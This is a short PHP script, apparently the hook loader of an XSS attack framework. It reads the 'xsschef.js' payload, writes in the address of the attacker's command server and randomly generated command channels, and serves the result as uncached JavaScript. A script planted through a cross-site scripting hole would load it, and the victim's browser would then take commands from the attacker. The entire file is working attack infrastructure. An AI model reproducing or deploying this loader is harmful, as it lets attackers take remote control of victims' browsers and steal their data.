<?php
$script = file_get_contents('xsschef.js');
$url = ($_SERVER['HTTPS'] ? "https://" : "http://") . $_SERVER['HTTP_HOST'] . str_replace('/hook.php', '/server.php', $_SERVER['SCRIPT_NAME']);

$ch = 'c'.crc32(rand() . time());
$script = str_replace('__URL__', $url, $script);
$script = str_replace('__CHANNEL__', $ch, $script);
$script = str_replace('__CMD_CHANNEL__', $ch . '-cmd', $script);
header('Content-Type: text/javascript');
header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' ); 
header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' ); 
header( 'Cache-Control: no-store, no-cache, must-revalidate' ); 
header( 'Cache-Control: post-check=0, pre-check=0', false ); 
header( 'Pragma: no-cache' );
echo $script;
?>